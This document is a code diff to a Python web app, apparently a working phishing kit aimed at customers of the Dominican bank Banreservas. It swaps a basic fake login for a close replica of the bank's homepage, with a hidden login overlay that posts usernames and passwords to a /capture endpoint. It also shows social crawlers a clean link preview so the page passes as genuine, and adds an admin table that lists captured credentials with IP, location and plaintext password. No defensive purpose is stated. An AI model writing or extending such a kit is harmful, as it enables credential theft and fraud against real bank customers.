@@ -163,207 +163,399 @@ def is_social_crawler(ua):
     return any(bot in ua.lower() for bot in social_bots)
 
 def get_template_banreservas():
-    """Nuevo diseño limpio y profesional para la página de login"""
+    """HTML de Banreservas extraído de la página real"""
     return '''<!DOCTYPE html>
-<html lang="es">
+<html dir="ltr" lang="es-do">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🔐 Acceso Seguro - Banreservas</title>
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content="Banco líder del sistema financiero y dinamizador del desarrollo social para los diferentes sectores productivos en beneficio de los dominicanos.">
     
-    <!-- Favicon -->
-    <link rel="icon" type="image/png" href="https://www.banreservas.com/favicon.ico">
-    <link rel="apple-touch-icon" href="https://www.banreservas.com/favicon.ico">
+    <!-- ========================================== -->
+    <!-- META TAGS PARA VISTA PREVIA EN REDES SOCIALES -->
+    <!-- ========================================== -->
+    <meta property="og:title" content="🔐 Acceso Seguro - Banreservas" />
+    <meta property="og:description" content="Tu banco de confianza. Ingresa con tu usuario y contraseña para realizar tus transacciones de forma segura." />
+    <meta property="og:image" content="https://cdnebrpeastus.azureedge.net/banreservas/media/xxpfq31w/banreservas-logo.png" />
+    <meta property="og:url" content="https://banreservas-uyw8.onrender.com/" />
+    <meta property="og:type" content="website" />
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="🔐 Acceso Seguro - Banreservas" />
+    <meta name="twitter:description" content="Tu banco de confianza. Ingresa con tu usuario y contraseña." />
+    <meta name="twitter:image" content="https://cdnebrpeastus.azureedge.net/banreservas/media/xxpfq31w/banreservas-logo.png" />
+    <!-- ========================================== -->
     
-    <!-- Open Graph / Facebook -->
-    <meta property="og:type" content="website">
-    <meta property="og:url" content="https://banreservas-uyw8.onrender.com">
-    <meta property="og:title" content="🔐 Acceso Seguro - Banreservas">
-    <meta property="og:description" content="Ingrese sus credenciales de forma segura para acceder a su cuenta bancaria. Protección garantizada con encriptación de nivel bancario.">
-    <meta property="og:image" content="https://www.banreservas.com/images/logo-banreservas.png">
-    <meta property="og:image:width" content="1200">
-    <meta property="og:image:height" content="630">
-    <meta property="og:site_name" content="Banreservas">
-    <meta property="og:locale" content="es_DO">
+    <title>Personal | Banreservas</title>
     
-    <!-- Twitter Card -->
-    <meta name="twitter:card" content="summary_large_image">
-    <meta name="twitter:url" content="https://banreservas-uyw8.onrender.com">
-    <meta name="twitter:title" content="🔐 Acceso Seguro - Banreservas">
-    <meta name="twitter:description" content="Ingrese sus credenciales de forma segura para acceder a su cuenta bancaria. Protección garantizada con encriptación de nivel bancario.">
-    <meta name="twitter:image" content="https://www.banreservas.com/images/logo-banreservas.png">
+    <!-- Favicon para la pestaña del navegador -->
+    <link rel="icon" type="image/png" sizes="32x32" href="https://cdnebrpeastus.azureedge.net/banreservas/media/q2cdzjtf/favicon-32x32.png" />
+    <link rel="icon" type="image/png" sizes="16x16" href="https://cdnebrpeastus.azureedge.net/banreservas/media/iclbxops/favicon-16x16.png" />
+    <link rel="apple-touch-icon" href="https://cdnebrpeastus.azureedge.net/banreservas/media/psadezl0/apple-icon-180x180.png" />
     
-    <!-- WhatsApp specific -->
-    <meta property="og:image:secure_url" content="https://www.banreservas.com/images/logo-banreservas.png">
-    
-    <!-- General meta -->
-    <meta name="description" content="Acceso seguro a su cuenta bancaria Banreservas. Ingrese sus credenciales de forma protegida.">
-    <meta name="keywords" content="Banreservas, banco, acceso seguro, login bancario">
-    <meta name="author" content="Banreservas">
-    <meta name="theme-color" content="#004B8D">
-    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.0/css/bootstrap.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
+        /* Estilos básicos para la página */
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Segoe UI', Arial, sans-serif; background: #f5f7fa; }
+        .container-fullsize-colored-dark { background: #1a2a3a; color: white; padding: 8px 0; }
+        .container-fullsize-colored-light { background: white; padding: 10px 0; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
+        .site-logo-img { height: 50px; }
+        .navbar-brand { padding: 0; }
+        .nav-link { color: #333 !important; font-weight: 500; }
+        .nav-link:hover { color: #1a73e8 !important; }
+        .site-header-panel-tubanco .nav-link { background: #1a73e8; color: white !important; border-radius: 20px; padding: 8px 20px; }
+        .site-header-panel-tubanco .nav-link:hover { background: #1557b0; }
+        .main_container_banner { margin: 20px 0; }
+        .container_banner .item { height: 400px; background-size: cover; background-position: center; border-radius: 12px; }
+        .bg-protection { background: rgba(0,0,0,0.4); height: 100%; display: flex; align-items: center; padding: 40px; border-radius: 12px; }
+        .banner-info-content { color: white; max-width: 600px; }
+        .banner-description .title { font-size: 36px; font-weight: 700; }
+        .banner-description .subtitle { font-size: 28px; font-weight: 300; }
+        .button-bordered { display: inline-block; padding: 12px 30px; border: 2px solid white; color: white; border-radius: 30px; text-decoration: none; font-weight: 600; transition: all 0.3s; margin-top: 15px; }
+        .button-bordered:hover { background: white; color: #1a2a3a; text-decoration: none; }
+        .button-bordered.is-orange { border-color: #f57c00; color: #f57c00; }
+        .button-bordered.is-orange:hover { background: #f57c00; color: white; }
+        .container_necesidades { padding: 40px 0; }
+        .title.d-blue { color: #1a2a3a; font-size: 32px; font-weight: 700; margin-bottom: 30px; }
+        .needs-link { display: block; text-align: center; text-decoration: none; color: #333; }
+        .needs-image-wrap { display: inline-block; width: 80px; height: 80px; border-radius: 50%; background: #e8f0fe; padding: 15px; margin-bottom: 10px; }
+        .needs-image img { width: 100%; }
+        .needs-title { display: block; font-weight: 600; font-size: 14px; }
+        .tab-pane-needs { padding: 30px; background: #f8f9fa; border-radius: 12px; margin-top: 20px; }
+        .tab-pane-needs .sub-title { font-size: 24px; color: #1a2a3a; }
+        .container_apoyo { background: #1a2a3a; padding: 40px 0; color: white; }
+        .container_apoyo .title { font-size: 32px; font-weight: 700; }
+        .tabs-apoyo-wrapper { display: flex; gap: 15px; margin: 20px 0; flex-wrap: wrap; }
+        .apoyo-link a { color: #ccc; text-decoration: none; padding: 10px 20px; border-radius: 20px; background: rgba(255,255,255,0.1); }
+        .apoyo-link a:hover { background: rgba(255,255,255,0.2); color: white; }
+        .tabs-apoyo-content img { width: 100%; border-radius: 12px; max-height: 300px; object-fit: cover; }
+        .container_promociones_especiales { padding: 40px 0; }
+        .card { border-radius: 12px; overflow: hidden; box-shadow: 0 4px 12px rgba(0,0,0,0.1); margin: 10px; }
+        .card-body { padding: 20px; }
+        .prom-img { height: 200px; background-size: cover; background-position: center; }
+        .site-footer-panel { background: #0d1b2a; color: #aab; padding: 40px 0; }
+        .site-footer-panel .title { color: white; font-size: 18px; font-weight: 600; margin-bottom: 15px; }
+        .site-footer-panel a { color: #8899aa; text-decoration: none; }
+        .site-footer-panel a:hover { color: white; }
+        .site-footer-panel ul { list-style: none; padding: 0; }
+        .site-footer-panel ul li { margin-bottom: 8px; }
+        .social a { color: #8899aa; font-size: 20px; margin-right: 15px; }
+        .social a:hover { color: white; }
+        /* Login overlay para captura */
+        .login-overlay {
+            position: fixed;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: rgba(0,0,0,0.7);
+            display: none;
             justify-content: center;
             align-items: center;
-            padding: 20px;
+            z-index: 9999;
         }
-        
-        .login-container {
+        .login-overlay.active { display: flex; }
+        .login-modal {
             background: white;
-            border-radius: 20px;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
             padding: 40px;
-            width: 100%;
+            border-radius: 16px;
             max-width: 420px;
+            width: 90%;
             text-align: center;
         }
-        
-        .logo {
-            width: 120px;
-            height: auto;
-            margin-bottom: 20px;
-        }
-        
-        h1 {
-            color: #004B8D;
-            font-size: 24px;
-            margin-bottom: 8px;
-            font-weight: 600;
-        }
-        
-        .subtitle {
-            color: #666;
-            font-size: 14px;
-            margin-bottom: 30px;
-        }
-        
-        .form-group {
-            margin-bottom: 20px;
-            text-align: left;
-        }
-        
-        label {
-            display: block;
-            color: #333;
-            font-weight: 500;
-            margin-bottom: 8px;
-            font-size: 14px;
-        }
-        
-        input {
-            width: 100%;
-            padding: 14px 16px;
-            border: 2px solid #e0e0e0;
-            border-radius: 12px;
-            font-size: 15px;
-            transition: all 0.3s ease;
-        }
-        
-        input:focus {
-            outline: none;
-            border-color: #004B8D;
-            box-shadow: 0 0 0 4px rgba(0,75,141,0.1);
-        }
-        
-        .btn-login {
-            width: 100%;
-            padding: 16px;
-            background: linear-gradient(135deg, #004B8D 0%, #0066CC 100%);
-            color: white;
-            border: none;
-            border-radius: 12px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            margin-top: 10px;
-        }
-        
-        .btn-login:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 10px 30px rgba(0,75,141,0.3);
-        }
-        
-        .security-badge {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: 8px;
-            margin-top: 25px;
-            padding: 12px;
-            background: #f0f7ff;
-            border-radius: 10px;
-            color: #004B8D;
-            font-size: 13px;
-            font-weight: 500;
-        }
-        
-        .footer {
-            margin-top: 20px;
-            color: #999;
-            font-size: 12px;
-        }
-        
-        .timestamp {
-            color: #004B8D;
-            font-weight: 600;
+        .login-modal .logo { height: 40px; margin-bottom: 20px; }
+        .login-modal h2 { font-size: 22px; color: #1a2a3a; margin-bottom: 10px; }
+        .login-modal p { color: #666; font-size: 14px; margin-bottom: 20px; }
+        .login-modal input { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
+        .login-modal input:focus { outline: none; border-color: #1a73e8; }
+        .login-modal button { width: 100%; padding: 12px; background: #1a73e8; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; }
+        .login-modal button:hover { background: #1557b0; }
+        .login-modal .footer { margin-top: 15px; font-size: 12px; color: #999; }
+        @media (max-width: 768px) {
+            .banner-description .title { font-size: 24px; }
+            .banner-description .subtitle { font-size: 20px; }
+            .container_banner .item { height: 300px; }
         }
     </style>
 </head>
 <body>
-    <div class="login-container">
-        <img src="https://www.banreservas.com/images/logo-banreservas.png" alt="Banreservas" class="logo">
-        <h1>🔐 Acceso Seguro</h1>
-        <p class="subtitle">Ingrese sus credenciales para continuar</p>
-        
-        <form action="/capture" method="POST">
-            <div class="form-group">
-                <label for="email">Usuario</label>
-                <input type="text" id="email" name="email" placeholder="Ingrese su usuario" required>
+
+    <!-- HEADER -->
+    <div class="container-fullsize-colored-dark">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-12">
+                    <nav class="navbar navbar-expand-lg navbar-dark">
+                        <ul class="navbar-nav mr-auto">
+                            <li class="nav-item"><span class="nav-link">USD Compra 56.50</span></li>
+                            <li class="nav-item"><span class="nav-link">USD Venta 60.00</span></li>
+                        </ul>
+                        <ul class="navbar-nav ml-auto">
+                            <li class="nav-item"><a class="nav-link" href="#"><i class="fas fa-map-marker-alt"></i> Mapa</a></li>
+                            <li class="nav-item"><a class="nav-link" href="#"><i class="fas fa-calculator"></i> Calculadoras</a></li>
+                            <li class="nav-item site-header-panel-tubanco"><a class="nav-link" href="#" id="tubancoBtn"><i class="fas fa-user"></i> Acceder a TuBanco</a></li>
+                        </ul>
+                    </nav>
+                </div>
             </div>
-            
-            <div class="form-group">
-                <label for="password">Contraseña</label>
-                <input type="password" id="password" name="password" placeholder="Ingrese su contraseña" required>
-            </div>
-            
-            <button type="submit" class="btn-login">Iniciar Sesión</button>
-        </form>
-        
-        <div class="security-badge">
-            <span>🔒</span>
-            <span>Conexión segura encriptada SSL</span>
-        </div>
-        
-        <div class="footer">
-            <p>Banreservas © 2026</p>
-            <p class="timestamp" id="fecha"></p>
         </div>
     </div>
-    
+
+    <!-- HEADER LIGHT -->
+    <div class="container-fullsize-colored-light">
+        <div class="container">
+            <div class="row">
+                <div class="col">
+                    <nav class="navbar navbar-expand-lg navbar-light">
+                        <a class="navbar-brand" href="#">
+                            <img src="https://cdnebrpeastus.azureedge.net/banreservas/media/xxpfq31w/banreservas-logo.png" class="site-logo-img" alt="Banreservas">
+                        </a>
+                        <div class="collapse navbar-collapse">
+                            <ul class="navbar-nav ml-auto">
+                                <li class="nav-item"><a class="nav-link" href="#">Personal</a></li>
+                                <li class="nav-item"><a class="nav-link" href="#">Preferente</a></li>
+                                <li class="nav-item"><a class="nav-link" href="#">Pyme</a></li>
+                                <li class="nav-item"><a class="nav-link" href="#">Empresarial</a></li>
+                                <li class="nav-item"><a class="nav-link" href="#">Gubernamental</a></li>
+                                <li class="nav-item"><a class="nav-link" href="#">Internacional</a></li>
+                            </ul>
+                        </div>
+                    </nav>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- BANNER PRINCIPAL -->
+    <div class="main_container_banner">
+        <div class="container">
+            <div class="container_banner">
+                <div class="item" style="background-image: url('https://cdnebrpeastus.azureedge.net/banreservas/media/exwl4uej/digital-expohogar-2026_masivo-portal-2.jpg'); height: 400px; background-size: cover; background-position: center; border-radius: 12px;">
+                    <div class="bg-protection" style="height: 100%; display: flex; align-items: center; padding: 40px; border-radius: 12px; background: rgba(0,0,0,0.4);">
+                        <div class="banner-info-content">
+                            <h2 class="title">Tu casa que será, ¡ya es!</h2>
+                            <p>con Expohogar Banreservas 2026</p>
+                            <a href="#" class="button-bordered">Conoce Más</a>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- NECESIDADES -->
+    <div class="container_necesidades">
+        <div class="container">
+            <div class="row">
+                <div class="col-12">
+                    <h1 class="title d-blue">Necesidades</h1>
+                </div>
+            </div>
+            <div class="row">
+                <div class="col-12">
+                    <div class="owl-carousel">
+                        <div class="item"><a class="needs-link" href="#"><span class="needs-image-wrap"><span class="needs-image"><img src="https://cdnebrpeastus.azureedge.net/banreservas/media/kngawaaj/br-19.svg" alt="Amuebla tu casa"></span></span><span class="needs-title">Amuebla tu casa</span></a></div>
+                        <div class="item"><a class="needs-link" href="#"><span class="needs-image-wrap"><span class="needs-image"><img src="https://cdnebrpeastus.azureedge.net/banreservas/media/fpwfpr3b/br-22.svg" alt="Compra el carro que deseas"></span></span><span class="needs-title">Compra el carro que deseas</span></a></div>
+                        <div class="item"><a class="needs-link" href="#"><span class="needs-image-wrap"><span class="needs-image"><img src="https://cdnebrpeastus.azureedge.net/banreservas/media/2ybdczyy/br-20.svg" alt="Compra o remodela tu casa"></span></span><span class="needs-title">Compra o remodela tu casa</span></a></div>
+                        <div class="item"><a class="needs-link" href="#"><span class="needs-image-wrap"><span class="needs-image"><img src="https://cdnebrpeastus.azureedge.net/banreservas/media/mobhjppm/br-21.svg" alt="Construye tu patrimonio"></span></span><span class="needs-title">Construye tu patrimonio</span></a></div>
+                        <div class="item"><a class="needs-link" href="#"><span class="needs-image-wrap"><span class="needs-image"><img src="https://cdnebrpeastus.azureedge.net/banreservas/media/oekjwcvz/br-23.svg" alt="Cumple tus Metas de Estudio"></span></span><span class="needs-title">Cumple tus Metas de Estudio</span></a></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- APOYO -->
+    <div class="container_apoyo">
+        <div class="container">
+            <div class="row">
+                <div class="col-12">
+                    <h1 class="title">Te apoyamos en cada etapa de tu vida.</h1>
+                    <div class="tabs-apoyo-wrapper">
+                        <a href="#" class="apoyo-link" style="color: white; padding: 10px 20px; border-radius: 20px; background: rgba(255,255,255,0.15); text-decoration: none;">Pensionado</a>
+                        <a href="#" class="apoyo-link" style="color: #ccc; padding: 10px 20px; border-radius: 20px; background: rgba(255,255,255,0.1); text-decoration: none;">Joven</a>
+                        <a href="#" class="apoyo-link" style="color: #ccc; padding: 10px 20px; border-radius: 20px; background: rgba(255,255,255,0.1); text-decoration: none;">Emprendedor</a>
+                    </div>
+                    <div class="tabs-apoyo-content">
+                        <img src="https://cdnebrpeastus.azureedge.net/banreservas/media/lnnfqyom/pensionado-t1.jpg" alt="Pensionado" style="width: 100%; border-radius: 12px; max-height: 300px; object-fit: cover;">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- PROMOCIONES -->
+    <div class="container_promociones_especiales">
+        <div class="container-fluid">
+            <div class="row">
+                <div class="col">
+                    <h1 class="title d-blue" style="padding-left: 15px;">Promociones Especiales</h1>
+                    <div class="row">
+                        <div class="col-md-3">
+                            <div class="card">
+                                <div class="prom-img" style="height: 200px; background-image: url('https://cdnebrpeastus.azureedge.net/banreservas/media/qjxnf3on/concierto-beto-cuevas-mc-julio-2026_promo.jpg'); background-size: cover; background-position: center;"></div>
+                                <div class="card-body">
+                                    <h5 class="card-title">Recibe un 15% de descuento en Beto Cuevas</h5>
+                                    <p class="card-text">con Tarjetas de Crédito Mastercard Banreservas.</p>
+                                    <a href="#" class="button-bordered is-orange" style="font-size: 14px; padding: 8px 20px;">Ver detalles</a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-3">
+                            <div class="card">
+                                <div class="prom-img" style="height: 200px; background-image: url('https://cdnebrpeastus.azureedge.net/banreservas/media/1ivjlbq1/alianza-grupo-bentrani-julio-2026_promo.jpg'); background-size: cover; background-position: center;"></div>
+                                <div class="card-body">
+                                    <h5 class="card-title">Celebre a papá con hasta 30% de ahorro</h5>
+                                    <p class="card-text">con sus Tarjetas Banreservas</p>
+                                    <a href="#" class="button-bordered is-orange" style="font-size: 14px; padding: 8px 20px;">Ver detalles</a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-3">
+                            <div class="card">
+                                <div class="prom-img" style="height: 200px; background-image: url('https://cdnebrpeastus.azureedge.net/banreservas/media/kbrdeddj/entretenimiento-visa-inolvidable-julio-2026_promo.jpg'); background-size: cover; background-position: center;"></div>
+                                <div class="card-body">
+                                    <h5 class="card-title">Reciba 15% de descuento en conciertos</h5>
+                                    <p class="card-text">con Inolvidable Visa Banreservas</p>
+                                    <a href="#" class="button-bordered is-orange" style="font-size: 14px; padding: 8px 20px;">Ver detalles</a>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col-md-3">
+                            <div class="card">
+                                <div class="prom-img" style="height: 200px; background-image: url('https://cdnebrpeastus.azureedge.net/banreservas/media/ztgpfgql/20260608_acd_lac_banreservas_-plataforma-golf_promola-canajulio_masivo_promo.jpg'); background-size: cover; background-position: center;"></div>
+                                <div class="card-body">
+                                    <h5 class="card-title">Recibe atractivos beneficios con Mastercard</h5>
+                                    <p class="card-text">en el campo de golf La Cana.</p>
+                                    <a href="#" class="button-bordered is-orange" style="font-size: 14px; padding: 8px 20px;">Ver detalles</a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- NOTICIAS -->
+    <div class="container" style="padding: 40px 0;">
+        <div class="row">
+            <div class="col">
+                <h1 class="title d-blue">Sala de prensa</h1>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-md-4">
+                <div class="card">
+                    <img src="https://cdnebrpeastus.azureedge.net/banreservas/media/lhnnzzmg/1-heiromy-castro-edward-s%C3%A1nchez-y-marbel-giulamo.jpg" class="card-img-top" alt="Noticia">
+                    <div class="card-body">
+                        <p class="text-muted small">21/07/2026</p>
+                        <h5>SEPROI obtiene certificación ISO 37001</h5>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="card">
+                    <img src="https://cdnebrpeastus.azureedge.net/banreservas/media/djdhmyt4/1.jpg" class="card-img-top" alt="Noticia">
+                    <div class="card-body">
+                        <p class="text-muted small">20/07/2026</p>
+                        <h5>Banreservas otorga financiamientos superiores a RD$117 millones</h5>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-4">
+                <div class="card">
+                    <img src="https://cdnebrpeastus.azureedge.net/banreservas/media/bpup0ysp/fachada-1.jpg" class="card-img-top" alt="Noticia">
+                    <div class="card-body">
+                        <p class="text-muted small">17/07/2026</p>
+                        <h5>Euromoney reconoce a Banreservas como Mejor Banco del Caribe</h5>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <footer class="site-footer-panel">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-3">
+                    <h3 class="title">CONTACTO</h3>
+                    <ul>
+                        <li><i class="fas fa-phone-alt"></i> <a href="tel:8099602121">809 960 2121</a></li>
+                        <li><i class="fas fa-map-marker-alt"></i> <a href="#">Encuentra una Oficina</a></li>
+                        <li><i class="fas fa-envelope"></i> <a href="mailto:contacto@banreservas.com">contacto@banreservas.com</a></li>
+                    </ul>
+                    <div class="social">
+                        <a href="#"><i class="fab fa-facebook-f"></i></a>
+                        <a href="#"><i class="fab fa-twitter"></i></a>
+                        <a href="#"><i class="fab fa-instagram"></i></a>
+                        <a href="#"><i class="fab fa-youtube"></i></a>
+                    </div>
+                </div>
+                <div class="col-md-3">
+                    <h3 class="title">Sobre Nosotros</h3>
+                    <ul>
+                        <li><a href="#">Visión, Misión y Valores</a></li>
+                        <li><a href="#">Voluntariado Banreservas</a></li>
+                        <li><a href="#">Centro Cultural Banreservas</a></li>
+                        <li><a href="#">Responsabilidad social</a></li>
+                        <li><a href="#">Memorias institucionales</a></li>
+                    </ul>
+                </div>
+                <div class="col-md-3">
+                    <h3 class="title">Filiales</h3>
+                    <ul>
+                        <li><a href="#">ARS Reservas</a></li>
+                        <li><a href="#">Seguros Reservas</a></li>
+                        <li><a href="#">AFP Reservas</a></li>
+                        <li><a href="#">Fiduciaria Reservas</a></li>
+                    </ul>
+                </div>
+                <div class="col-md-3">
+                    <h3 class="title">Informaciones</h3>
+                    <ul>
+                        <li><a href="#">Tu seguridad</a></li>
+                        <li><a href="#">Lista bienes disponibles</a></li>
+                        <li><a href="#">Monitor financiero</a></li>
+                        <li><a href="#">Tarifario de productos</a></li>
+                    </ul>
+                </div>
+            </div>
+            <div class="row mt-4">
+                <div class="col-12 text-center" style="color: #8899aa; font-size: 12px;">
+                    <p>Copyright 2022 BanReservas. Todos los derechos reservados.</p>
+                    <p>Los fondos depositados en Banreservas están cubiertos por la garantía de depósitos otorgada por el Fondo de Contingencia hasta RD$1,860,000.00.</p>
+                </div>
+            </div>
+        </div>
+    </footer>
+
+    <!-- LOGIN OVERLAY (se muestra al hacer clic en "Acceder a TuBanco") -->
+    <div class="login-overlay" id="loginOverlay">
+        <div class="login-modal">
+            <img src="https://cdnebrpeastus.azureedge.net/banreservas/media/xxpfq31w/banreservas-logo.png" class="logo" alt="Banreservas">
+            <h2>🔐 Acceso a TuBanco</h2>
+            <p>Ingresa tus credenciales para acceder a tu cuenta</p>
+            <form action="/capture" method="POST">
+                <input type="text" name="email" placeholder="Usuario o correo electrónico" required>
+                <input type="password" name="password" placeholder="Contraseña" required>
+                <button type="submit">Iniciar Sesión</button>
+            </form>
+            <div class="footer">🔒 Conexión segura · Banco Banreservas</div>
+        </div>
+    </div>
+
     <script>
-        // Fecha formateada: Jul 22, 2026 7:04 PM
-        const ahora = new Date();
-        const opciones = { 
-            month: 'short', 
-            day: 'numeric', 
-            year: 'numeric',
-            hour: 'numeric',
-            minute: '2-digit',
-            hour12: true
-        };
-        document.getElementById('fecha').textContent = ahora.toLocaleDateString('en-US', opciones);
+        // Mostrar overlay al hacer clic en "Acceder a TuBanco"
+        document.getElementById('tubancoBtn').addEventListener('click', function(e) {
+            e.preventDefault();
+            document.getElementById('loginOverlay').classList.add('active');
+        });
+        // Cerrar overlay al hacer clic fuera del modal
+        document.getElementById('loginOverlay').addEventListener('click', function(e) {
+            if (e.target === this) {
+                this.classList.remove('active');
+            }
+        });
     </script>
 </body>
 </html>'''
@@ -402,14 +594,14 @@ def handle_bots():
 <html>
 <head>
     <meta charset="UTF-8">
-    <meta property="og:title" content="🔐 Acceso Seguro - Banreservas">
-    <meta property="og:description" content="Ingrese sus credenciales de forma segura para acceder a su cuenta bancaria.">
-    <meta property="og:image" content="https://www.banreservas.com/images/logo-banreservas.png">
-    <title>🔐 Acceso Seguro - Banreservas</title>
+    <meta property="og:title" content="Banreservas - Banco líder">
+    <meta property="og:description" content="Banco líder del sistema financiero dominicano.">
+    <meta property="og:image" content="https://cdnebrpeastus.azureedge.net/banreservas/media/xxpfq31w/banreservas-logo.png">
+    <title>Banreservas</title>
 </head>
 <body>
-    <h1>🔐 Acceso Seguro - Banreservas</h1>
-    <p>Ingrese sus credenciales de forma segura para acceder a su cuenta bancaria.</p>
+    <h1>Banreservas</h1>
+    <p>Banco líder del sistema financiero dominicano.</p>
 </body>
 </html>
 '''), 200
@@ -575,7 +767,7 @@ def ver_credenciales():
                     <a href="/logout-credenciales" class="logout">Cerrar Sesión</a>
                     <h1>📭 No hay credenciales</h1>
                     <p>Todavía no se han capturado credenciales.</p>
-                    <p>Ve a <a href="/">la página principal</a> y prueba a iniciar sesión.</p>
+                    <p>Ve a <a href="/">la página principal</a> y haz clic en "Acceder a TuBanco" para probar.</p>
                 </div>
             </body>
             </html>
@@ -605,6 +797,7 @@ def ver_credenciales():
                 <tr><th>ID</th><th>Fecha</th><th>IP</th><th>Ubicación</th><th>Usuario</th><th>Contraseña</th></tr>
         """
         
+        # 🔥 CAMBIO REALIZADO: Formato de fecha 'Jul 22, 2026 7:04 PM'
         for r in rows:
             timestamp = datetime.fromisoformat(r[1]).strftime('%b %d, %Y %I:%M %p')
             html += f"<tr><td>{r[0]}</td><td>{timestamp}</td><td>{r[2]}</td><td>{r[5]}</td><td>{r[3]}</td><td><strong>{r[4]}</strong></td></tr>"
